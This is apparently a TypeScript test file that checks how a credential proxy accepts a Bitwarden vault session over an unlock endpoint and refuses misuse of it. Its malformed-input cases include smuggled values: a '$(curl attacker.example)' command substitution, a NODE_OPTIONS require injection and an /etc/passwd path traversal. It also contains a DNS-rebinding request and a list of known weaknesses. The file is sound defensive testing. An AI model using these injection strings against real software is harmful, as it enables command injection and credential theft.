/**
 * Conformance: a proxy on the `bitwarden` backend is handed its session over
 * `POST /_vault/unlock` (`aquaman unlock`), keeps it in memory, and treats a
 * locked vault as a state with one fix.
 *
 * The first table is what a locked proxy answers on every endpoint that
 * needs the vault. The second is the ways the hand-over could be abused, one
 * row each: the worst a caller may reach is making the proxy read the vault
 * that `bw` is logged in to with a session the caller already holds, or a
 * refusal. The rows marked LIMIT are what the code does not stop.
 *
 * The proxy is a real one in this process on a real `BitwardenStore`; `bw`
 * is the stand-in from test/helpers/fake-bw.ts. The real CLI is never run.
 *
 * NIST SP 800-53 IA-5 (authenticator management), AC-3 (access enforcement),
 * SC-28 (protection of information at rest), AU-2 (audit events).
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as http from 'node:http';
import * as os from 'node:os';
import * as path from 'node:path';

const cp = vi.hoisted(() => ({ spawnSync: vi.fn() }));
vi.mock('node:child_process', async (original) => ({ ...(await original<typeof import('node:child_process')>()), spawnSync: cp.spawnSync }));

import {
  createCredentialProxy,
  createBrokerScope,
  createServiceRegistry,
  type CredentialProxy,
  type CredentialPrompter,
  type RequestInfo,
} from 'aquaman-proxy';
import { MemoryStore, wrapWithCache, createCredentialLinker, type CredentialStore } from 'aquaman-core';
import { BitwardenStore } from '../../packages/proxy/src/core/credentials/backends/bitwarden.js';
import { VAULT_UNLOCK_PATH, VAULT_LOCK_PATH, UNLOCK_MAX_REFUSALS } from '../../packages/proxy/src/vault-session.js';
import { runUnlock, type UnlockDeps } from '../../packages/proxy/src/vault-unlock.js';
import { MockUpstream, createMockUpstream } from '../helpers/mock-upstream.js';
import { tmpSocketPath, cleanupSocket, udsFetch } from '../helpers/uds-proxy.js';
import { createFakeBw, fakeSession, type FakeBw } from '../helpers/fake-bw.js';

const LOOPBACK_TOKEN = 'aqm_lb_vault_unlock_conformance_0123456789';
const SESSION = fakeSession('the-session-a-person-unlocked');
const OTHER = fakeSession('a-session-bw-does-not-accept');
const GITHUB_VALUE = 'ghp_fake_vault_value_0123456789';
const STRIPE_VALUE = 'sk_live_fake_vault_value_0123456789';
const FIX = 'Run: aquaman unlock';

describe('a vault a person unlocks', () => {
  let bw: FakeBw;
  let proxy: CredentialProxy | undefined;
  let store: CredentialStore;
  let upstream: MockUpstream;
  let socketPath: string;
  let log: RequestInfo[];
  let printed: string[];
  let asked: number;
  let unlockedCalls: number;
  let tmp: string;

  beforeEach(async () => {
    bw = createFakeBw();
    bw.state.items.set('aquaman::github::token', GITHUB_VALUE);
    bw.state.items.set('aquaman::stripe::secret_key', STRIPE_VALUE);
    cp.spawnSync.mockReset();
    cp.spawnSync.mockImplementation((cmd: string, args?: string[], opts?: { env?: Record<string, string>; input?: string }) => bw.spawnSync(cmd, args, opts));
    delete process.env['BW_SESSION'];
    upstream = createMockUpstream();
    await upstream.start(0);
    socketPath = tmpSocketPath();
    log = [];
    printed = [];
    asked = 0;
    unlockedCalls = 0;
    proxy = undefined;
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'aqvu-'));
    for (const stream of ['log', 'error', 'warn'] as const) {
      vi.spyOn(console, stream).mockImplementation((...args: unknown[]) => { printed.push(args.map(String).join(' ')); });
    }
  });

  afterEach(async () => {
    if (proxy?.isRunning()) await proxy.stop();
    await upstream.stop();
    cleanupSocket(socketPath);
    fs.rmSync(tmp, { recursive: true, force: true });
    vi.restoreAllMocks();
    delete process.env['BW_SESSION'];
  });

  /** A daemon as `aquaman daemon` builds it: the backend behind the cache, a broker scope, both listeners. */
  async function daemon(opts: { store?: CredentialStore; cacheTtl?: number } = {}): Promise<void> {
    store = opts.store ?? wrapWithCache(new BitwardenStore({ serving: true }), opts.cacheTtl ?? 0);
    const registry = createServiceRegistry();
    registry.override('github', { upstream: `http://127.0.0.1:${upstream.port}` });
    registry.override('stripe', { upstream: `http://127.0.0.1:${upstream.port}` });
    const configPath = path.join(tmp, 'config.yaml');
    fs.writeFileSync(configPath, 'broker:\n  allowedRefs:\n    - aquaman://github/token\n');
    const scope = createBrokerScope({ configPath, projectsPath: path.join(tmp, 'projects.yaml') });
    const prompter: CredentialPrompter = {
      askValue: async () => { asked++; return { outcome: 'declined' }; },
      askApproval: async () => { asked++; return { outcome: 'declined' }; },
      askLoginItem: async () => { asked++; return { outcome: 'declined' }; },
    };
    proxy = createCredentialProxy({
      socketPath,
      store,
      serviceRegistry: registry,
      allowedServices: ['github'],
      broker: { ...scope, routedRefs: () => new Set(['aquaman://stripe/secret_key']) },
      credentialRequests: { prompter, declare: () => {}, links: createCredentialLinker({ store, backend: 'bitwarden', configPath }) },
      loopback: { port: 0, token: LOOPBACK_TOKEN, host: '127.0.0.1' },
      policyConfig: { github: { defaultAction: 'allow', rules: [{ method: 'DELETE', path: '/repos/**', action: 'deny' }] } },
      onRequest: (info) => { log.push(info); },
      onVaultUnlocked: () => { unlockedCalls++; },
    });
    await proxy.start();
  }

  const post = (urlPath: string, body: unknown) =>
    udsFetch(socketPath, urlPath, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: typeof body === 'string' ? body : JSON.stringify(body) });
  const overLoopback = (urlPath: string, body: unknown, headers: Record<string, string> = { 'x-aquaman-token': LOOPBACK_TOKEN }) =>
    fetch(`http://${proxy!.getLoopbackAddress()}${urlPath}`, { method: 'POST', headers: { 'Content-Type': 'application/json', ...headers }, body: JSON.stringify(body) });
  /** A request as a browser page would send it after DNS rebinding: the right token, somebody else's host name. */
  const rebound = (urlPath: string, body: unknown) => new Promise<{ status: number; text(): Promise<string> }>((done, fail) => {
    const [host, port] = proxy!.getLoopbackAddress()!.split(':');
    const req = http.request({ host, port: Number(port), path: urlPath, method: 'POST', headers: { Host: 'attacker.example', 'Content-Type': 'application/json', 'x-aquaman-token': LOOPBACK_TOKEN } }, (res) => {
      let text = '';
      res.on('data', (c) => { text += c; });
      res.on('end', () => done({ status: res.statusCode ?? 0, text: async () => text }));
    });
    req.on('error', fail);
    req.end(JSON.stringify(body));
  });
  const health = async () => JSON.parse((await udsFetch(socketPath, '/_health')).body) as { status: string; vault?: string };
  const resolve = () => post('/broker/resolve', { service: 'github', key: 'token' });
  const unlock = async (session = SESSION) => {
    bw.state.sessions.add(SESSION);
    return post(VAULT_UNLOCK_PATH, { session });
  };
  const bwStarts = () => bw.bwCalls().length;
  /** Everything a caller, a log reader or someone looking at the daemon's output could see. */
  const observable = (extra: string[] = []) => [...extra, JSON.stringify(log), ...printed].join('\n');

  // -------------------------------------------------------------------------

  describe('the daemon starts and stays up while the vault is locked', () => {
    it('starts with no session, says so over the socket only, and serves what needs no vault', async () => {
      await daemon();
      expect(await health()).toMatchObject({ status: 'ok', vault: 'locked' });
      const lb = await (await fetch(`http://${proxy!.getLoopbackAddress()}/_health`)).json() as Record<string, unknown>;
      expect(lb.status).toBe('ok');
      expect(lb).not.toHaveProperty('vault');
      expect((await udsFetch(socketPath, '/_hostmap')).status).toBe(200);
      // A health check never starts the vault's CLI.
      const before = bwStarts();
      await health();
      expect(bwStarts()).toBe(before);
    });

    it.each([
      ['/broker/resolve for a declared reference', () => post('/broker/resolve', { service: 'github', key: 'token' })],
      ['a forwarded request', () => udsFetch(socketPath, '/github/user')],
      ['/broker/route for a routed reference', () => post('/broker/route', { service: 'stripe', key: 'secret_key' })],
      ['/broker/request for a reference', () => post('/broker/request', { service: 'github', key: 'token' })],
      ['/broker/request that names a vault item', () => post('/broker/request', { service: 'github', key: 'other', from: 'bw://Work GitHub/password' })],
    ])('%s answers 503 vault_locked with the one fix, and nothing was read, asked or sent upstream', async (_name, call) => {
      await daemon();
      const res = await call();
      expect(res.status, res.body).toBe(503);
      expect(JSON.parse(res.body)).toMatchObject({ code: 'vault_locked', fix: FIX });
      expect(res.body).not.toContain(GITHUB_VALUE);
      expect(asked).toBe(0);
      expect(upstream.requests).toHaveLength(0);
    });

    it('/broker/available answers false and says the vault is locked, so a caller can tell it from "nothing stored"', async () => {
      await daemon();
      const res = await post('/broker/available', { refs: [{ service: 'github', key: 'token' }] });
      expect(JSON.parse(res.body)).toEqual({ available: [false], locked: true, code: 'vault_locked', fix: FIX });
    });

    it.each([
      ['/broker/resolve for an undeclared reference', () => post('/broker/resolve', { service: 'github', key: 'undeclared' }), 404, 'broker_ref_not_declared'],
      ['/broker/route for a reference nobody routed', () => post('/broker/route', { service: 'github', key: 'token' }), 404, 'route_not_recorded'],
      ['/broker/resolve for the reserved service', () => post('/broker/resolve', { service: 'aquaman_internal', key: 'audit_anchor' }), 404, undefined],
    ])('the scope is still checked before the vault: %s is refused as when unlocked, and says nothing of the lock', async (_name, call, status, code) => {
      await daemon();
      const res = await call();
      expect(res.status).toBe(status);
      if (code) expect(JSON.parse(res.body).code).toBe(code);
      expect(res.body).not.toContain('vault_locked');
    });

    it('/broker/available for references out of scope does not report the lock', async () => {
      await daemon();
      const res = await post('/broker/available', { refs: [{ service: 'github', key: 'undeclared' }] });
      expect(JSON.parse(res.body)).toEqual({ available: [false] });
    });

    it('a request that policy denies is denied as before, without the vault', async () => {
      await daemon();
      const res = await udsFetch(socketPath, '/github/repos/a/b', { method: 'DELETE' });
      expect(res.status).toBe(403);
    });

    it('each refusal is audited as a failure that names the lock, and a locked vault never takes the daemon down', async () => {
      await daemon();
      await resolve();
      await udsFetch(socketPath, '/github/user');
      expect(log.map((e) => e.error)).toEqual(['vault_locked: github/token', 'vault_locked: github/token']);
      expect(proxy!.isRunning()).toBe(true);
      expect((await health()).status).toBe('ok');
    });

    it('after the hand-over every one of them works, and the listener for unlock is told once', async () => {
      await daemon();
      expect((await unlock()).status).toBe(200);
      expect(unlockedCalls).toBe(1);
      expect(await health()).toMatchObject({ vault: 'unlocked' });
      expect(JSON.parse((await resolve()).body).value).toBe(GITHUB_VALUE);
      expect((await udsFetch(socketPath, '/github/user')).status).toBe(200);
      expect(upstream.requests[0].headers['authorization']).toContain(GITHUB_VALUE);
      expect(JSON.parse((await post('/broker/available', { refs: [{ service: 'github', key: 'token' }] })).body)).toEqual({ available: [true] });
      expect((await post('/broker/route', { service: 'stripe', key: 'secret_key' })).status).toBe(200);
    });

    it.each([
      ['bw lock', () => bw.lock()],
      ['bw logout', () => { bw.state.loggedIn = false; }],
      ['another bw unlock, which ends the earlier key', () => { bw.state.sessions.clear(); bw.state.sessions.add(OTHER); }],
    ])('a session ended by %s lands in the same state with the same fix', async (_name, end) => {
      await daemon();
      await unlock();
      expect((await resolve()).status).toBe(200);
      end();
      const res = await resolve();
      expect(res.status).toBe(503);
      expect(JSON.parse(res.body)).toMatchObject({ code: 'vault_locked', fix: FIX });
      expect(await health()).toMatchObject({ vault: 'locked' });
      const forwarded = await udsFetch(socketPath, '/github/user');
      expect(forwarded.status).toBe(503);
      expect(JSON.parse(forwarded.body)).toMatchObject({ code: 'vault_locked', fix: FIX });
    });
  });

  // -------------------------------------------------------------------------

  describe('the hand-over cannot be turned into more than it is', () => {
    it('a session bw accepts is adopted, and it appears in no reply, audit entry or line of output', async () => {
      await daemon();
      const res = await unlock();
      expect(res.status).toBe(200);
      expect(JSON.parse(res.body)).toEqual({ status: 'unlocked' });
      const resolved = await resolve();
      const again = await post(VAULT_UNLOCK_PATH, { check: true });
      expect(JSON.parse(again.body)).toEqual({ status: 'unlocked' });
      expect(observable([res.body, resolved.body, again.body, JSON.stringify(await health())])).not.toContain(SESSION);
      expect(log.find((e) => e.method === 'VAULT_UNLOCK')).toMatchObject({ service: 'aquaman-vault', statusCode: 200, error: undefined });
    });

    it('the session reaches bw in its environment and never in its arguments', async () => {
      await daemon();
      await unlock();
      await resolve();
      expect(bw.bwCalls().some((c) => c.env['BW_SESSION'] === SESSION)).toBe(true);
      for (const call of bw.calls) expect(call.args.join(' ')).not.toContain(SESSION);
    });

    it.each([
      ['the loopback listener with the agent hosts\' token', () => overLoopback(VAULT_UNLOCK_PATH, { session: SESSION }), 404, 'vault_unlock_socket_only'],
      ['the loopback listener with no token', () => overLoopback(VAULT_UNLOCK_PATH, { session: SESSION }, {}), 401, undefined],
      ['the loopback listener with a made-up token', () => overLoopback(VAULT_UNLOCK_PATH, { session: SESSION }, { Authorization: 'Bearer aqm_rt_0000' }), 401, undefined],
      ['the loopback listener under another host name', () => rebound(VAULT_UNLOCK_PATH, { session: SESSION }), 403, undefined],
      ['the session as the loopback token\'s header value', () => overLoopback(VAULT_UNLOCK_PATH, { session: SESSION }, { 'x-aquaman-token': SESSION }), 401, undefined],
    ])('a valid session sent over %s is refused and not looked at', async (_name, send, status, code) => {
      await daemon();
      bw.state.sessions.add(SESSION);
      const before = bwStarts();
      const res = await send();
      const text = await res.text();
      expect(res.status, text).toBe(status);
      if (code) expect(JSON.parse(text).code).toBe(code);
      expect(text).not.toContain(SESSION);
      expect(bwStarts()).toBe(before);
      expect(await health()).toMatchObject({ vault: 'locked' });
    });

    it('the token a routed program holds does not reach the endpoint either', async () => {
      await daemon();
      await unlock();
      const { token } = JSON.parse((await post('/broker/route', { service: 'stripe', key: 'secret_key' })).body) as { token: string };
      await post(VAULT_LOCK_PATH, {});
      for (const urlPath of [VAULT_UNLOCK_PATH, VAULT_LOCK_PATH]) {
        const res = await overLoopback(urlPath, { session: SESSION }, { Authorization: `Bearer ${token}` });
        expect(res.status).toBe(401);
      }
      expect(await health()).toMatchObject({ vault: 'locked' });
    });

    it.each([
      ['an empty string', ''],
      ['a word', 'unlock-me'],
      ['a session with a line break and a second variable', `${SESSION}\nNODE_OPTIONS=--require=/tmp/x.js`],
      ['a session followed by a bw option', `${SESSION} --session ${OTHER}`],
      ['shell text', '$(curl attacker.example)AAAAAAAAAAAAAAAA'],
      ['a path', '../../../../etc/passwd/AAAAAAAAAAAAAAAA'],
      ['a NUL byte', `${SESSION.slice(0, 20)}\u0000${SESSION.slice(20)}`],
      ['600 characters', 'A'.repeat(600)],
    ])('%s is refused as malformed, bw is not started, and nothing is written to the log', async (_name, value) => {
      await daemon();
      const before = bwStarts();
      const res = await post(VAULT_UNLOCK_PATH, { session: value });
      expect(res.status).toBe(400);
      expect(JSON.parse(res.body).code).toBe('session_malformed');
      expect(bwStarts()).toBe(before);
      expect(log).toHaveLength(0);
      expect(await health()).toMatchObject({ vault: 'locked' });
    });

    it.each([
      ['a number', { session: 1234567890123456 }],
      ['a list', { session: [SESSION] }],
      ['an object', { session: { toString: SESSION } }],
      ['no session and no check', {}],
      ['check that is not true', { check: 'yes' }],
      ['not JSON', 'session=' + SESSION],
      ['a body over the limit', { session: SESSION, padding: 'x'.repeat(4096) }],
    ])('a body with %s is refused without starting bw', async (_name, body) => {
      await daemon();
      bw.state.sessions.add(SESSION);
      const before = bwStarts();
      const res = await post(VAULT_UNLOCK_PATH, body);
      expect(res.status).toBe(400);
      expect(res.body).not.toContain(SESSION);
      expect(bwStarts()).toBe(before);
      expect(await health()).toMatchObject({ vault: 'locked' });
    });

    it('a session bw does not accept is refused, audited without the value, and leaves the daemon locked', async () => {
      await daemon();
      const res = await post(VAULT_UNLOCK_PATH, { session: OTHER });
      expect(res.status).toBe(403);
      expect(JSON.parse(res.body)).toMatchObject({ code: 'session_refused', fix: FIX });
      expect(observable([res.body])).not.toContain(OTHER);
      expect(log.map((e) => [e.method, e.error])).toEqual([['VAULT_UNLOCK', 'unlock refused: session_refused']]);
      expect(await health()).toMatchObject({ vault: 'locked' });
      expect(unlockedCalls).toBe(0);
    });

    it('a session bw does not accept cannot lock a working daemon or replace its session', async () => {
      await daemon();
      await unlock();
      expect((await post(VAULT_UNLOCK_PATH, { session: OTHER })).status).toBe(403);
      expect(await health()).toMatchObject({ vault: 'unlocked' });
      expect(JSON.parse((await resolve()).body).value).toBe(GITHUB_VALUE);
      expect(bw.bwCalls('get', 'item').pop()!.env['BW_SESSION']).toBe(SESSION);
    });

    it('a session for another account than the one the daemon started with is refused', async () => {
      await daemon();
      // What a caller would have to do: log bw out and in again as someone else.
      bw.state.userId = 'user-of-the-caller';
      bw.state.sessions.add(OTHER);
      const res = await post(VAULT_UNLOCK_PATH, { session: OTHER });
      expect(res.status).toBe(403);
      expect(JSON.parse(res.body).code).toBe('account_changed');
      expect(await health()).toMatchObject({ vault: 'locked' });
    });

    it('with bw logged out the answer is a person\'s step, not an adopted session', async () => {
      bw.state.loggedIn = false;
      await daemon();
      const res = await post(VAULT_UNLOCK_PATH, { session: SESSION });
      expect(res.status).toBe(409);
      expect(JSON.parse(res.body)).toMatchObject({ code: 'not_logged_in', fix: expect.stringContaining('bw login') });
    });

    it('refused sessions are counted: after a few, bw is no longer started for the next one', async () => {
      await daemon();
      for (let i = 0; i < UNLOCK_MAX_REFUSALS; i++) {
        expect((await post(VAULT_UNLOCK_PATH, { session: fakeSession(`guess-${i}`) })).status).toBe(403);
      }
      const before = bwStarts();
      const entries = log.length;
      for (let i = 0; i < 20; i++) {
        const res = await post(VAULT_UNLOCK_PATH, { session: fakeSession(`more-${i}`) });
        expect(res.status).toBe(429);
        expect(JSON.parse(res.body).code).toBe('unlock_rate_limited');
      }
      expect(bwStarts()).toBe(before);
      // And the caller cannot fill the audit log by going on.
      expect(log.length).toBe(entries);
    });

    it('a check asks bw about the session the daemon holds and can only confirm it or find it ended', async () => {
      await daemon();
      expect(JSON.parse((await post(VAULT_UNLOCK_PATH, { check: true })).body)).toEqual({ status: 'locked' });
      await unlock();
      // `check` beside a session does not skip the check of that session.
      expect((await post(VAULT_UNLOCK_PATH, { check: true, session: OTHER })).status).toBe(403);
      expect(JSON.parse((await post(VAULT_UNLOCK_PATH, { check: true })).body)).toEqual({ status: 'unlocked' });
      bw.lock();
      expect(JSON.parse((await post(VAULT_UNLOCK_PATH, { check: true })).body)).toEqual({ status: 'locked' });
      expect(log.filter((e) => e.method === 'VAULT_UNLOCK').map((e) => e.error)).toContain('vault locked: the vault no longer accepts the session');
    });

    it.each(['GET', 'PUT', 'DELETE'])('%s on the unlock path is not an endpoint', async (method) => {
      await daemon();
      const res = await udsFetch(socketPath, VAULT_UNLOCK_PATH, { method });
      expect(res.status).toBe(404);
      expect(await health()).toMatchObject({ vault: 'locked' });
    });

    it('a proxy whose backend takes no session refuses both endpoints and reports no vault state', async () => {
      await daemon({ store: new MemoryStore() });
      expect(await health()).not.toHaveProperty('vault');
      for (const urlPath of [VAULT_UNLOCK_PATH, VAULT_LOCK_PATH]) {
        const res = await post(urlPath, { session: SESSION });
        expect(res.status).toBe(404);
        expect(JSON.parse(res.body).code).toBe('vault_session_unsupported');
      }
      expect(bwStarts()).toBe(0);
    });
  });

  // -------------------------------------------------------------------------

  describe('aquaman lock', () => {
    it('the daemon drops its session and its cached values, bw is not told, and the change is audited', async () => {
      await daemon({ cacheTtl: 900 });
      await unlock();
      expect((await resolve()).status).toBe(200);
      const before = bwStarts();
      const res = await post(VAULT_LOCK_PATH, {});
      expect(JSON.parse(res.body)).toEqual({ status: 'locked' });
      expect(bwStarts()).toBe(before);
      expect(bw.state.sessions.has(SESSION)).toBe(true);
      // The value read while it was open is not served from the cache.
      expect((await resolve()).status).toBe(503);
      expect(log.find((e) => e.method === 'VAULT_LOCK')).toMatchObject({ service: 'aquaman-vault', error: undefined });
      // Locking what is locked changes nothing and records nothing.
      const entries = log.length;
      await post(VAULT_LOCK_PATH, {});
      expect(log.length).toBe(entries);
    });

    it('is refused on the loopback listener', async () => {
      await daemon();
      await unlock();
      const res = await overLoopback(VAULT_LOCK_PATH, {});
      expect(res.status).toBe(404);
      expect(JSON.parse(await res.text()).code).toBe('vault_lock_socket_only');
      expect(await health()).toMatchObject({ vault: 'unlocked' });
    });
  });

  // -------------------------------------------------------------------------
  // What the code does not stop. Each assertion states what would have to
  // hold for the limit to be gone.

  describe('limits', () => {
    it.fails('LIMIT: any program running as the user can hand over a session it holds; the endpoint cannot tell a person from a program, so this is not a boundary against same-user software', async () => {
      await daemon();
      // No terminal, no person: a program that already holds a valid session.
      const res = await unlock();
      expect(res.status).not.toBe(200);
    });

    it.fails('LIMIT: any program running as the user can lock the daemon; the person then has to run aquaman unlock again', async () => {
      await daemon();
      await unlock();
      await post(VAULT_LOCK_PATH, {});
      expect(await health()).toMatchObject({ vault: 'unlocked' });
    });

    it.fails('LIMIT: a program that keeps sending refused sessions keeps a person\'s aquaman unlock out for the length of the window', async () => {
      await daemon();
      for (let i = 0; i < UNLOCK_MAX_REFUSALS; i++) await post(VAULT_UNLOCK_PATH, { session: fakeSession(`flood-${i}`) });
      expect((await unlock()).status).toBe(200);
    });

    it.fails('LIMIT: a session ended outside the daemon (bw lock) is noticed at the next read that reaches bw; a value already in the cache is served until its TTL', async () => {
      await daemon({ cacheTtl: 900 });
      await unlock();
      expect((await resolve()).status).toBe(200);
      bw.lock();
      expect((await resolve()).status).toBe(503);
    });

    it.fails('LIMIT: the account is pinned for one run of the daemon; a program that logs bw in to another account before the daemon starts has it read that account\'s vault', async () => {
      bw.state.userId = 'user-of-the-caller';
      bw.state.sessions.add(OTHER);
      await daemon();
      expect((await post(VAULT_UNLOCK_PATH, { session: OTHER })).status).not.toBe(200);
    });

    it.fails('LIMIT: bw takes the session from its environment, so each bw the daemon starts carries it where other software running as the user can read a process environment', async () => {
      await daemon();
      await unlock();
      await resolve();
      for (const call of bw.bwCalls()) expect(Object.values(call.env)).not.toContain(SESSION);
    });

    it.fails('LIMIT: aquaman unlock hands the session to whatever answers on the proxy socket; a program that took the socket\'s place receives it', async () => {
      const received: unknown[] = [];
      const deps: UnlockDeps = {
        backend: 'bitwarden',
        isTerminal: true,
        shellSession: undefined,
        bwInstalled: () => true,
        bwStatus: () => 'locked',
        bwUnlock: async () => ({ code: 0, stdout: SESSION }),
        daemon: {
          // Not the daemon: something else listening where the daemon would.
          health: async () => ({ reachable: true, vault: 'locked' }),
          post: async (_path, body) => { received.push(body); return { status: 200, json: { status: 'unlocked' } }; },
        },
        say: () => {},
      };
      await runUnlock(deps);
      expect(JSON.stringify(received)).not.toContain(SESSION);
    });
  });
});
